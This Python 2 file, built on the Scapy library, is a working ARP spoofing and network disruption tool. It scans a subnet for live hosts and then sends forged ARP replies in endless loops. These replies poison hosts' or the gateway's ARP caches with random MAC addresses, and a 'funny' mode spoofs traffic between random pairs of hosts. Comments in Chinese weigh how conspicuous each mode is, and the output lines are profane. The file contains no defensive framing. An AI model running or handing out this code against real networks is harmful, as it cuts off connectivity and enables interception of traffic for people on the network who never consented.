# coding=utf-8
from scapy.all import *
import threading
import Queue
from optparse import OptionParser
from netaddr import *
import time


def get_mac(ip_address):
    # ARP request is constructed. sr function is used to send/ receive a layer 3 packet
    # Alternative Method using Layer 2: resp, unans =  srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=ip_address))
    resp, unans = sr(ARP(op=1, hwdst="ff:ff:ff:ff:ff:ff", pdst=ip_address), retry=2, timeout=10, verbose=False)
    for s, r in resp:
        return r[ARP].hwsrc
    return None


# def arp_discovry():
# srploop(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst='192.168.113.254'), timeout=2)


def sendFakeReply(src_ip, src_mac, dst_ip, dst_mac):
    sendp(Ether(src=src_mac, dst=dst_mac) / ARP(psrc=src_ip, hwsrc=src_mac, pdst=dst_ip, hwdst=dst_mac, op=2),
          verbose=False)


class ArpScaner(threading.Thread):
    def __init__(self, queqe):
        threading.Thread.__init__(self)
        self.queqe = queqe

    def run(self):
        while True:
            try:
                ip = self.queqe.get(block=True, timeout=1)
            except Queue.Empty:
                break
            arp_resp = srp1(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip, op=1), verbose=False, timeout=1)
            if arp_resp != None:
                print 'Find IP %s : Mac %s' % (ip, arp_resp[ARP].hwsrc)
                target_queqe.put({'ip': ip, 'mac': arp_resp[ARP].hwsrc})
                target_list.append({'ip': ip, 'mac': arp_resp[ARP].hwsrc})
            self.queqe.task_done()


target_queqe = Queue.Queue()
target_list = []


def main():
    ipaddr_quequ = Queue.Queue()

    parser = OptionParser()
    parser.add_option('-r', '--reverse', dest='reverse', action='store_true', default=False)
    parser.add_option('--funny', dest='funny', action='store_true', default=False)
    parser.add_option('-t', '--target', dest='target', type='string')
    parser.add_option('-g', '--gateway', dest='gateway', type='string')

    (option, args) = parser.parse_args()

    if option.target is None:
        parser.print_help()
        exit(0)

    if option.gateway is not None:
        gateway_mac = get_mac(option.gateway)
    white_list=['192.168.113.210']
    # Only work well with Linux,should use ipaddress on Windows.
    for ip in IPNetwork(option.target):
        if ip not in white_list:
            ipaddr_quequ.put(str(ip))

    scanList = []

    for i in range(20):
        scaner = ArpScaner(ipaddr_quequ)
        scanList.append(scaner)

    for t in scanList:
        t.start()
    for t in scanList:
        t.join()
    print 'Scaning Finished'
    size = target_queqe.qsize()

    if option.funny:
        import random
        for i in range(size):
            funny_spoofer = FunnyArpSpoofer(target_queqe)
            funny_spoofer.start()
        return

    for i in range(size):
        spoofer = ArpSpoofer(target_queqe, gateway_ip=option.gateway, gateway_mac=gateway_mac, reverse=option.reverse)
        spoofer.start()


#   for i in range(size):
#         attackOne = TargetOne(target_queqe, '192.168.113.254')
#        attackOne.start()

# 没什么杀伤力,刷屏还可以
class TargetOne(threading.Thread):
    def __init__(self, queue, targetIP):
        threading.Thread.__init__(self)
        self.queue = queue
        self.targetIP = targetIP

    def run(self):
        while True:
            try:
                dic = self.queue.get()
            except Queue.Empty:
                break
            while True:
                # sendFakeReply(src_ip='192.168.113.254', src_mac='44:44:44:44:44:44', dst_ip=dic['ip'],dst_mac=dic['mac'])
                sendp(Ether(src=dic['mac']) / ARP(hwsrc=dic['mac'], psrc=dic['ip'], pdst=self.targetIP, op=1),
                      verbose=False)
                print 'Fucking %s' % dic['ip']

# 混乱模式
class FunnyArpSpoofer(threading.Thread):
    def __init__(self, queue):
        threading.Thread.__init__(self)
        self.queue = queue

    def run(self):
        while True:
            try:
                dic = self.queue.get()
            except Queue.Empty:
                break
            while True:
                r1 = random.randint(0, len(target_list) - 1)
                r2 = random.randint(0, len(target_list) - 1)
                sendp(
                    Ether(src=target_list[r1]['mac'], dst=target_list[r2]['mac'])
                    / ARP(psrc=target_list[r1]['ip'], hwsrc=RandMAC(), pdst=target_list[r2]['ip'], hwdst=target_list[r2]['mac'], op=2),
                    verbose=False)
                #sendFakeReply(src_ip=target_list[r1]['ip'], src_mac=RandMAC()
                #              , dst_ip=target_list[r2]['ip'], dst_mac=target_list[r1]['mac']
                #              )
                print 'Fucking %s : %s -> %s :%s' % (
                    target_list[r1]['ip'], target_list[r1]['mac'], target_list[r2]['ip'], target_list[r2]['mac'])

# 普通模式,太明显了
class ArpSpoofer(threading.Thread):
    def __init__(self, queue, gateway_ip, gateway_mac='', reverse=False):
        threading.Thread.__init__(self)
        self.queue = queue
        self.reverse = reverse
        self.gateway_ip = gateway_ip
        self.gateway_mac = gateway_mac
        if self.gateway_mac == '':
            self.gateway_mac = get_mac(self.gateway_ip)

    def run(self):
        while True:
            try:
                dic = self.queue.get()
            except Queue.Empty:
                break
            while True:
                # 直接传递函数会导致Ether层跟ARP层包HWADDR不一致
                rand_mac = RandMAC()
                if self.reverse:
                    sendFakeReply(src_ip=dic['ip'], src_mac=rand_mac,
                                  dst_ip=self.gateway_ip,
                                  dst_mac=self.gateway_mac)
                    print 'Fucking %s : %s -> %s :%s' % (dic['ip'], dic['mac'], self.gateway_ip, self.gateway_mac)
                    # sendp(Ether(dst=dic['mac']) / ARP(pdst=dic['ip'], op=1), verbose=False)
                else:
                    sendFakeReply(src_ip=self.gateway_ip, src_mac=rand_mac, dst_ip=dic['ip'],
                                  dst_mac=dic['mac'])
                    print 'Fucking %s : %s -> %s :%s' % (self.gateway_ip, self.gateway_mac, dic['ip'], dic['mac'])


if __name__ == '__main__':
    main()
